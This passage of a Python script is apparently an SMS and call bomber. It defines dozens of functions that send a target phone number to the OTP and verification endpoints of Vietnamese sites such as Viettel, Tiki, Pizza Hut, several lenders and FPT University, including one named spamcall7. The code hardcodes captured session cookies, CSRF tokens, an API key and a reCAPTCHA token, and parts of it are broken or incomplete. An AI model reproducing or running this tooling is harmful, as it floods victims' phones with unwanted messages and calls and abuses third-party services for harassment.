        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
def VIE(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)
def m1(phone):
    head = {
        "Host": "meta.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://meta.vn",
        "referer": "https://meta.vn/account/register",
        "cookie": "ssid=smfszyszu3tq5h02lmly12yz;cart=fc5bf0de-45de-4323-a007-f7860e71a5a1;ckmid=262a67477e774f56b3de7e656e741682"
    }
    data = '{"apiargs":{"lgUser":"' + phone + '","act":"send","type":"phone"},"apimethod":"CheckExist"}'
    GET = json(CURL("POST", "https://meta.vn/appscripts/pages/AccountReact.aspx?apimode=1", data, head, False))

def m2(phone):
    head = {
        "Host": "api.tamo.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.tamo.vn",
        "referer": "https://www.tamo.vn/",
    }
    data = '{"mobilePhone":{"number":"' + phone + '"}}'
    access = json(CURL("POST", "https://api.tamo.vn/web/public/client/phone/sms-code-ts", data, head, False))
def TUOITRE(phone):
    url = "https://tuoitre.vn"  # Replace with the correct URL
    headers = {
        "Host": "tuoitre.vn",
        "accept": "application/json, text/plain, */*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
        "origin": "https://sso.tuoitre.vn",
        "cookie": "_ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselh"
        
    }         
def MONEYVEO(phone):
    def generateRandomString(length):
        letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        return ''.join(random.choice(letters) for i in range(length))
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
    }
    
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
        "cookie": ck,
    }
    
    response = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)
    access = json.loads(response.text)
def CAFELAND(phone):
  head = {
    'Host': 'nhadat.cafeland.vn',
    'accept': 'application/json, text/javascript, /; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://nhadat.cafeland.vn',
    'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
    'cookie': 'fbp=fb.1.1681635921620.1153873944;zi=2000.SSZzejyD6zyjZAYrmnPo2t9yFR9GbVGRvNYDTG5S9vX-sYtrDTZ7k4wA7VKrJ1UeBfxDjNLSLyXkJfCm.1;XSRF-TOKEN=eyJpdiI6ImlmZ2dwR3E3cmN6c0swa1lna0NOTXc9PSIsInZhbHVlIjoidG5NWWxOS1FxZTU0ZVFxekN4SmI1Z0VmVXQ5T2gwK1kxXC9HQTV6VFJDRVZ1U0haXC8yMldIYTdySERMS250aHdQIiwibWFjIjoiZGRlOTdhMjU5NGYyZGJkZDMzMmQxMTY2NDhkNDM2YjQ4M2JhMjI1YWRmYWYzZWViNDQ3ZmVlM2Y2NzNkMWM5MCJ9;laravelsession=eyJpdiI6IkJNSWdvektYKzJWMnZ1SGRzeTJpSVE9PSIsInZhbHVlIjoiYUY4dnlUbzI3bWhxK0Y5VkRIbXVwaWN3V3RLYmpZV04zemxib2krTEhRZTVPUlpraG40eE9Oa3Q5Q1wvMExrYmciLCJtYWMiOiJjNTNkMTNlMzIwZGIzNGZmNTY5MDQ5OGEzNTkzZGQ5MTlhMGE2NmVmMzM1ZTlkNzA3ZjRlMWFlNWQwNDg0Y2Y3In0%3D'
  }
  get = CURL("GET", "https://nhadat.cafeland.vn/dang-ky.html", None, head, False)
  token = get.split('name="token" value="')[1].split('"')[0]
  data = "mobile="+phone+"&token="+token
  get = json.loads(CURL("POST", "https://nhadat.cafeland.vn/member-send-otp/", data, head, False))

def DAIHOCFPT(phone):
  head = {
    "Host": "daihoc.fpt.edu.vn",
    "accept": "/",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://daihoc.fpt.edu.vn",
    "referer": "https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/"
  }
  data = "firstname=Khang&mobilephone="+phone+"&email=tenhkhong3%40gmail.com&cityid=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc&ldpid=tuyen-sinh-dh-fpt&utmsource=&utmmedium=&utmcampaign=&utmterm=&urlreferer=&utmcpname=&utmadscampaign=&scripturi=https%3A%2F%2Fdaihoc.fpt.edu.vn%2Ftuyen-sinh-dh-fpt%2F&typeregister="
  get = CURL("POST", "https://daihoc.fpt.edu.vn/tstt/tuyen-sinh-dh-fpt/register.php", data, head, false)
  get = CURL("GET", "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?mobile="+phone+"&resendopt=1", None, head, False)                           
def thitruong(phone):
    headers = {
        "Host": "api.thitruongsi.com",
        "content-length": "641",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {
        "account_phone": phone
    }
    
    url = "https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone"
def PIZZAHUT(phone):
    headers = {
        "Host": "pizzahut.vn",
        "Content-Length": "91",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Origin": "https://pizzahut.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://pizzahut.vn/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "x_polaris_sd=98vLElKu62K7WNZoG06W1nsexHNKEFnfAsoJ|T5b6wSq7Trlg9g8n/c4z|gvAgcmzDnvm7JMKJFFkFr0vYtTayscI/8HhifBDClmz/odXi8MRDqfL1scd2cfpzMcqXi3BV!!"
    }

    data = {
        "keyData": "appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone=" + phone
    }

    response = requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest", 
                             headers=headers, 
                             data=json.dumps(data))

def callsms(phone):
    headers = {
        "Host": "api.thantaioi.vn",
        "accept-language": "vi",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "/",
        "origin": "https://thantaioi.vn",
        "referer": "https://thantaioi.vn/"
    }
    
    data = {
        "fullname": "Khang pro",
        "firstname": "pro",
        "lastname": "Khang",
        "mobilephone": phone,
        "targeturl": "caydenthan.vn/"
    }
    
    response = requests.post("https://api.thantaioi.vn/api/user", data=json.dumps(data), headers=headers)
    get = json.loads(response.text)
    token = get["token"]
    
    if token:
        headers = {
            "Host": "api.thantaioi.vn",
            "accept-language": "vi",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type": "application/json",
            "authorization": "Bearer " + token,
            "accept": "*/*",
            "origin": "https://thantaioi.vn",
            "referer": "https://thantaioi.vn/"
        }
        
        response = requests.get("https://api.thantaioi.vn/api/user/phone-confirmation-code", headers=headers)
def call11(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)        
def spamcall7(phone):
  cookies = {
        'PHPSESSID': 'ae1d4123e1fe19a5fb8cdbab6c9b4d1a',
    'cf_clearance': 'YV3IWV9zzUUSCCb2VfeeedsJ.R2VAum7l77mKo70TBY-1692768481-0-1-e78c5eb9.a954487d.153662d3-0.2.1692768481',
    }
  headers = {
        'authority': 'duong.codes',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=ae1d4123e1fe19a5fb8cdbab6c9b4d1a; cf_clearance=YV3IWV9zzUUSCCb2VfeeedsJ.R2VAum7l77mKo70TBY-1692768481-0-1-e78c5eb9.a954487d.153662d3-0.2.1692768481',
    'origin': 'https://duong.codes',
    'referer': 'https://duong.codes/client/sms-free',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  data = {
    'phone': phone,
    'csrf_token': '8d6567abae147665e4425a8fb0744e9951fe78bba3f056c3028ed1d521f7126c',
}

  response = requests.post('https://duong.codes/cron/spam-free.php', cookies=cookies, headers=headers, data=data)
def tiki00(phone): ##test tiki 1
  
  headers = {
        'authority': 'products.popsww.com',
    'accept': '*/*',
    'accept-language': 'vi',
    'api-key': '5d2300c2c69d24a09cf5b09b',
    'content-type': 'application/json',
    'lang': 'vi',
    'origin': 'https://pops.vn',
    'platform': 'web',
    'profileid': '64e1e6f408d1be004137e058',
    'referer': 'https://pops.vn/auth/signin-signup/signup',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sub-api-version': '1.1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-env': 'production',
}
  json_data = {
    'fullName': '',
    'account': phone,
    'password': 'ahhhhh@AA!',
    'confirmPassword': 'ahhhhh@AA!',
    'recaptcha': '03ADUVZwAIxA_ftv3Rp5GfWfz0mgTrSKr5a-kAFdabYR8HaQmYCplyYOFhqFVfiBrftaprtgBWnNBb2hexkTtpqN-pfZo1klMsb6ncjvepYFjeDSIqWU4KG3x4chrC8g2WW3uuCL9jLhTAEUCsPvxP4KSFlDQfKoEjlBL_Uo_xke7D_bpczZPffUTL0rUTmidatZ-0YjiLOz-q3CQpsxLClcrJJDKH-TEJ48qYyj-y-QtPXKJGgwIq_6H3moODfl4he0MfuCw6TBPGN6JhjzY7V5klVCjcV8y5HsVoXhZ72iZ9dzGFqXxX0o3PTTa0DOmzT7D3vae9PeLKvIB0tnP2pgDm-XnfqDfTkngJtzcoB61bysihFOeNmUH2I0fiv_lDXVO4bTuxcCD9iDZAGdnMLu0cJ6AVnTMr9cbfMDc0dpph02FR0CwY3O8dspHPxpInD0VkDa1T12e5RCdqIeGdYYQ9UIBrHidrlicVQzmdRlXfwCTnW4NfQDiQ_p-Wa1dr9htdC_mco5Ktw4X-e2wzy2_knSCCbUSCkcqeVTRBi6wQJFA8Vj51EjhUQ2njdHz9JiQ1rF-ter4wRLzhN8QqUWWAxLKJCqJ7GhtEijg1WaBwJZH1Rv6xxS6UcBjMywV6cK1DB8ti0KN4FBpYexqikTH-EG3FITuCT-H8CkH9ZQ7JVJ9u8BNYDF6cpSXC9pj7uLtePzgvzRy95DBLeCe-iANmb3KGijP2H7w2QVKLTbj9djEb4sIgXrAWAgZiVhhjAsOAsFVVhTI9CAZrfcg9sn61KjktI_DYcpqFe_Tdvih6kgXJ3I3SuGyswCTImeNd4YVTJMZ4HIEc5aIyY4yG__jw7JyLUC-MlKLVH110YESPQ7edSRruIbwlibhSJUAT5cM8beLluecuLvj1ZPds16zyDHwMCTrV0J8_3qwueNX0OguxkXW74hYy60a8OBoFbS_TC3JtTA6sOvBS8fD9EAsGtEqyPWDeVXIDYKL1Iic4L4tMuTUqTsXCGjcYA2z2K_em9dAoOOPEFX2FN-Ous2VCIesPE5rrCS1vYx3EehV-_5UrZuVkDBqbT5YoZI-4x4lz8ZBTgI3GBGlZx_MKitaRl6xQE7cWikEgMPyEyQILicGJFUfqdqO5ju40ecldrVQKZ-Tz8TxxP51P8MbJBSVI1AfOCYjg_mGJ4MRUZ4oDDN6cS8EWV8Fn4bJm8WY43ZfRP9Kid4xkTOEi1HSvu9M6wap72_wc58YcnVQPDSTJvgnx5fA2lDFINeC0rlPDM9MvZdlHyduVlb0CvNHpxpJMgh9dUsc2Fd321YiXNc9-Cxx-OU5Fy1Nhr7k2X0T61-WkJlsAoLeT2I6aEsy2xhKz0BXaeYm_LICmhkj_DM3a1laSTSDo5j3sm2tSErcVaMpdUHmw-7it-I2F2d1RlWnt_hpKRDMgRPvTtjVOH8o4rippfrpKiVL_R3kCj1L2Thmxav1KfWBcH6OwCSTETv7P7B0Hf5a_YddzWuLMnCjz08NXTpDBRvLvByqthg5ulJbARYvgADln',
}

  response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data)


def callv11(phone):
    cookies = {
        '_gcl_au': '1.1.2046735143.1688124277',
        '_gid': 'GA1.3.324859919.1688124278',
        '_tt_enable_cookie': '1',
        '_ttp': 'wn86kpVMWDe_EJy2p8BRWhxLKey',
        '_ga': 'GA1.1.76499769.1688124278',
        '_acbswcu_l': '0',
        '_acbswcu_stateData': 'eyJzaG93IjpmYWxzZSwiaGVpZ2h0IjpudWxsLCJyaWdodCI6MH0%3D',
        '_ga_MTBX8SYKKD': 'GS1.1.1688124278.1.1.1688124300.0.0.0',
    }

    headers = {
        'authority': 'app.tienoi.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6,zh-CN;q=0.5,zh;q=0.4',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.2046735143.1688124277; _gid=GA1.3.324859919.1688124278; _tt_enable_cookie=1; _ttp=wn86kpVMWDe_EJy2p8BRWhxLKey; _ga=GA1.1.76499769.1688124278; _acbswcu_l=0; _acbswcu_stateData=eyJzaG93IjpmYWxzZSwiaGVpZ2h0IjpudWxsLCJyaWdodCI6MH0%3D; _ga_MTBX8SYKKD=GS1.1.1688124278.1.1.1688124300.0.0.0',
        'origin': 'https://app.tienoi.com.vn',
        'referer': 'https://app.tienoi.com.vn/auth/registration?need=2000000&days=14',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobilePhone': phone,
        'password': 'A123456789a',
        'passwordConfirmation': 'A123456789a',
        'isVoiceSms': True,
    }

    response = requests.post(
        'https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobilePhone":"0972936627","password":"A123456789a","passwordConfirmation":"A123456789a","isVoiceSms":true}'
    #response = requests.post(
    #    'https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode',
    #    cookies=cookies,
    #    headers=headers,
    #    data=data,
    #)
def a44(phone):
    cookies = {
        '_gid': 'GA1.2.1019704199.1688123462',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1688123461.1.1.1688123540.56.0.0',
        '_ga': 'GA1.1.313940094.1688123462',
        '_ga_7ZDGMGYGRG': 'GS1.2.1688123462.1.1.1688123540.0.0.0',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1019704199.1688123462; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1688123461.1.1.1688123540.56.0.0; _ga=GA1.1.313940094.1688123462; _ga_7ZDGMGYGRG=GS1.2.1688123462.1.1.1688123540.0.0.0',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )


    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"84929617101"}'
    #response = requests.post('https://api.dongplus.vn/api/user/send-one-time-password', cookies=cookies, headers=headers, data=data)
def a37(phone):
  headers = {
    'authority':
    'api.dongplus.vn',
    'accept':
    '*/*',
    'accept-language':
    'vi',
    'content-type':
    'application/json',
    'origin':
    'https://dongplus.vn',
    'referer':
    'https://dongplus.vn/user/login',
    'sec-ch-ua':
    '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile':
    '?1',
    'sec-ch-ua-platform':
    '"Android"',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'same-site',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': phone,
  }
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                headers=headers,
                json=json_data)
def tiki01(phone): ##test tiki 2
  cookies = {
        '_trackity': '4ce4fc3f-a56a-55e5-0167-0b11bee7bfe9',
    '_gcl_au': '1.1.835789139.1691829108',
    'TOKENS': '{%22access_token%22:%22Y9QZxa28RKzGwcqfODV6jIN7LMC4kAem%22}',
    'delivery_zone': 'Vk4wNjYwMjUwMDg=',
    'amp_99d374': 'aHzIkl_ASe4-vXR5LQyg6_...1h85vam7n.1h85vaptl.b.h.s',
    '_gid': 'GA1.2.1466793505.1692417747',
    'tiki_client_id': '494132615.1691829105',
    '_gat': '1',
    '_ga_GSD4ETCY1D': 'GS1.1.1692417750.2.0.1692417750.60.0.0',
    '_ga': 'GA1.1.494132615.1691829105',
    '_hjSessionUser_522327': 'eyJpZCI6ImEyZDQ0MWYyLWNiMTEtNTVmYi05YjYyLTI3YzFhOGQ2MWJmYiIsImNyZWF0ZWQiOjE2OTE4MjkxMDgwMjYsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjIncludedInSessionSample_522327': '0',
    '_hjSession_522327': 'eyJpZCI6IjFlODNjMTdiLWFkYTctNDBjYi04ODA2LTZkZjVjZDU4OWNjYiIsImNyZWF0ZWQiOjE2OTI0MTc3NTAzNzIsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    }
  headers = {
        'authority': 'tiki.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
